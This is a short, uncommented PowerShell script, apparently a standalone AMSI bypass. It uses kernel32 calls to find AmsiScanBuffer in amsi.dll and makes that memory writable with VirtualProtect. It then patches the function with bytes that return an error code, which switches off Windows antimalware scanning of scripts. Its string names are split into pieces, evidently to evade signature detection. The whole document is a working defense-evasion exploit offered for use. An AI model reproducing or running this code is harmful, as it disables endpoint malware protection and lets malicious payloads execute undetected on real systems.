$MethodDefinition = @"
[DllImport(`"kernel32`",  EntryPoint="GetProcAddress")]
public static extern IntPtr GetProc(IntPtr hModule, string procName);

[DllImport(`"kernel32`")]
public static extern IntPtr GetModuleHandle(string lpModuleName);

[DllImport(`"kernel32`",EntryPoint="VirtualProtect" )]
public static extern bool Virtual(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@;
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kern' -NameSpace 'W' -PassThru;
$ABSD = 'Ams'+'iS'+'canBuffer';
$handle = [W.Kern]::GetModuleHandle('ams'+'i.dll');
[IntPtr]$BAddress = [W.Kern]::GetProc($handle, $ABSD);
[UInt32]$Size = 0x5;
[UInt32]$PFlag = 0x40;
[UInt32]$OFlag = 0;
[W.Kern]::Virtual($BAddress, $Size, $PFlag, [Ref]$OFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);
[system.runtime.interopservices.marshal]::copy($buf, 0, $BAddress, 6);